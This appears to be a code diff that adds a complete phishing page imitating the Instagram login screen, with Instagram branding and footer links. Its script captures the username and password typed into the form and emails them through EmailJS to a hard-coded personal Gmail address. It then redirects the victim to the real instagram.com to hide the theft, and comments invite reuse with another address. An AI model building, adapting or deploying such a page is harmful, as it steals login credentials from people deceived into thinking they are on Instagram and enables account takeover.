@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      flex-direction: column;
+    }
+    .main-container {
+      display: flex;
+      max-width: 350px;
+      width: 100%;
+      padding: 20px;
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+    .form-container {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .form-container img {
+      margin-bottom: 20px;
+    }
+    .form-container form {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+    }
+    .form-container input {
+      margin-bottom: 10px;
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+    }
+    .form-container button {
+      background-color: #0095f6;
+      color: #fff;
+      padding: 10px;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .form-container .or {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      width: 100%;
+      text-align: center;
+    }
+    .form-container .or::before,
+    .form-container .or::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+    .form-container .or::before {
+      margin-right: 10px;
+    }
+    .form-container .or::after {
+      margin-left: 10px;
+    }
+    .form-container a {
+      color: #0095f6;
+      text-decoration: none;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+    .form-container .signup {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+    .app-container {
+      margin-top: 20px;
+      text-align: center;
+    }
+    .app-container img {
+      height: 40px;
+      margin: 5px;
+    }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #8e8e8e;
+    }
+    .footer a {
+      text-decoration: none;
+      color: #8e8e8e;
+    }
+    .container {
+      display: flex;
+      max-width: 930px;
+      width: 100%;
+      align-items: center;
+      justify-content: center;
+    }
+    .image-container {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .image-container img {
+      max-width: 100%;
+      height: auto;
+    }
+    .error-message {
+      color: red;
+      font-size: 12px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="image-container">
+      <img src="assets/img/homepage.png" alt="">
+    </div>
+    <div class="main-container">
+      <div class="form-container">
+        <img src="assets/img/instagram.svg" alt="Instagram" height="51" width="175">
+        <form id="loginForm">
+          <input type="text" placeholder="Phone number, username, or email" id="email" required>
+          <span id="emailError" class="error-message">Please enter a valid email address.</span>
+          <input type="password" placeholder="Password" id="password" required minlength="6">
+          <span id="passwordError" class="error-message">Password must be at least 6 characters long.</span>
+          <button type="submit">Log In</button>
+        </form>
+        <div class="or">OR</div>
+        <a href="https://www.instagram.com/">Log in with Facebook</a>
+        <a href="#" class="forgot-password">Forgotten your password?</a>
+        <div class="or" style="color:black;"></div>
+      </div>
+      <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
+      <div class="app-container">
+        <p>Get the app.</p>
+        <img src="assets/img/apple.png" alt="Download on the App Store">
+        <img src="assets/img/google.png" alt="Get it on Google Play">
+      </div>
+    </div>
+  </div>
+  <div class="footer">
+    <p>
+      <a href="#">Meta</a> ·
+      <a href="#">About</a> ·
+      <a href="#">Blog</a> ·
+      <a href="#">Jobs</a> ·
+      <a href="#">Help</a> ·
+      <a href="#">API</a> ·
+      <a href="#">Privacy</a> ·
+      <a href="#">Terms</a> ·
+      <a href="#">Locations</a> ·
+      <a href="#">Instagram Lite</a> ·
+      <a href="#">Threads</a> ·
+      <a href="#">Contact uploading and non-users</a> ·
+      <a href="#">Meta Verified</a>
+    </p>
+    <p>
+      English (UK) © 2024 Instagram from Meta
+    </p>
+  </div>
+
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function() {
+      emailjs.init("IRjyYgGQs0wNcarqj"); // Replace with your EmailJS Public Key
+    })();
+
+    function validateEmail(email) {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return emailRegex.test(email);
+    }
+
+    document.getElementById('email').addEventListener('input', function() {
+      const emailError = document.getElementById('emailError');
+      if (validateEmail(this.value)) {
+        emailError.style.display = 'none';
+      } else {
+        emailError.style.display = 'block';
+      }
+    });
+
+    document.getElementById('password').addEventListener('input', function() {
+      const passwordError = document.getElementById('passwordError');
+      if (this.value.length >= 6) {
+        passwordError.style.display = 'none';
+      } else {
+        passwordError.style.display = 'block';
+      }
+    });
+
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      if (validateEmail(email) && password.length >= 6) {
+        const templateParams = {
+          to_email: "aditya.krich@gmail.com", // Replace with your email
+          from_email: email,
+          password: password
+        };
+
+        emailjs.send('service_yfmdgr3', 'template_ee8ygyt', templateParams)
+          .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+            window.location.href = "https://www.instagram.com/";
+          }, function(error) {
+            console.error('FAILED...', error);
+            alert('Failed to send email. Please try again.');
+          });
+      } else {
+        alert("Please enter a valid email and password.");
+      }
+    });
+  </script>
+</body>
+</html>
